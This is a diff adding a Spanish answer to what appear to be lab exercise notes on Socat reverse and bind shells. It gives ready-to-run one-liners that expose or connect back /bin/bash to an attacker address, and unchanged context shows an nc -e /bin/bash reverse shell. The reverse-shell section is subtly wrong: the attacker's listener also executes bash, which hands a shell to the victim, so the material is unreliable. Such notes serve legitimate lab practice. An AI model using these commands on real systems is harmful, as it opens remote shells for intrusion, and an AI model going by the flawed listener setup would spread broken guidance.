@@ -180,8 +180,117 @@ nc <IP_ATACANTE> 5555 -e /bin/bash
 
 ---
 ---
+**PREGUNTA**
 
 Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
+
+**RESPUESTA**
+
+**Socat Reverse y Bind Shells en Linux**
+
+---
+
+### Requisitos
+
+* `socat` instalado en ambas máquinas (víctima y atacante).
+* IP y puertos abiertos para conexiones TCP.
+
+---
+
+### 1. **Bind Shell con Socat (victima escucha)**
+
+En máquina víctima (Linux objetivo):
+
+```bash
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+* Escucha en puerto 4444.
+* Por cada conexión, ejecuta `/bin/bash` con pseudo-terminal (`pty`), salida de error (`stderr`), sesión propia (`setsid`), y manejo de señales (`sigint`).
+* `fork` para múltiples conexiones.
+
+En máquina atacante (local):
+
+```bash
+nc <IP_VICTIMA> 4444
+```
+
+---
+
+### 2. **Reverse Shell con Socat (victima conecta al atacante)**
+
+En máquina atacante (local), escuchar:
+
+```bash
+socat -d -d TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+* Igual que bind shell, escucha en puerto 5555.
+
+En máquina víctima (Linux objetivo), conectar:
+
+```bash
+socat TCP:<IP_ATACANTE>:5555 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+---
+
+### 3. **Explicación de flags socat**
+
+* `TCP-LISTEN:<port>`: escucha conexiones TCP en puerto.
+* `reuseaddr`: permite reusar puerto sin espera.
+* `fork`: crea proceso hijo para cada conexión.
+* `EXEC:/bin/bash`: ejecuta shell.
+* `pty`: asigna pseudo-terminal para shell interactiva.
+* `stderr`: conecta salida de errores.
+* `setsid`: ejecuta en nueva sesión.
+* `sigint`: permite enviar señal CTRL-C.
+* `sane`: configura terminal en modo saneable.
+
+---
+
+### 4. **Notas**
+
+* Usar puertos libres y no bloqueados.
+* Asegurar que firewall permite conexiones.
+* Socat genera shells más estables y completas que netcat.
+* Estabilizar shell no suele ser necesario si se usa `pty`.
+
+---
+
+### 5. **Ejemplo completo bind shell**
+
+Víctima:
+
+```bash
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+Atacante:
+
+```bash
+nc 10.201.17.102 4444
+```
+
+---
+
+### 6. **Ejemplo completo reverse shell**
+
+Atacante:
+
+```bash
+socat -d -d TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+Víctima:
+
+```bash
+socat TCP:10.2.2.22:5555 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+
+---
+---
 
 Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.
 
